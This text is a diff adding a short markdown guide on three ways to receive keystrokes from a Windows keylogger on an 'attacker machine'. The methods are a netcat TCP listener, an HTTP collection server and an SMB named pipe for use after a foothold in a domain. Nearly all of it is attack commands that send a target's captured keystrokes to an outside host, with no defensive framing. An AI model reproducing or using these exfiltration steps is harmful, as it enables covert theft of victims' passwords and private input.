@@ -1,0 +1,33 @@
+# 3 ways to listen to the Windows keylogger from your device
+Option 1: Network socket (built-in, simplest)
+
+Add a --listen flag that makes the keylogger send every keystroke over TCP to your attacker machine.
+
+On your attacker machine (terminal):
+```bash
+nc -lvnp 4444
+# or
+ncat -lvnp 4444 > captured.log```
+On the Windows target (the keylogger command):
+```keystroke run --listen 192.168.1.100:4444```
+# Option 2: HTTP REST endpoint (if you want structured data)
+
+Same pattern as the Android exfil but for Windows.
+
+On your attacker machine:
+```bash 
+keystroke server --port 8080 --out win_capture.json```
+On the Windows target:
+```bash keystroke run --server http://192.168.1.100:8080 --buffer 50```
+# Option 3: SMB named pipe (lateral movement / domain)
+
+If you're already inside the network with a beacon on the target, you can pipe keystrokes over SMB — no listener port needed, blends with normal Windows traffic.
+
+On the attacker machine (must be domain-joined or have credentials):
+```bash
+# Create a named pipe listener on your machine
+keystroke pipe --pipe-name keystroke```
+On Windows target:
+```bash
+keystroke run --pipe \\\\ATTACKER_PC\\pipe\\keystroke```
+
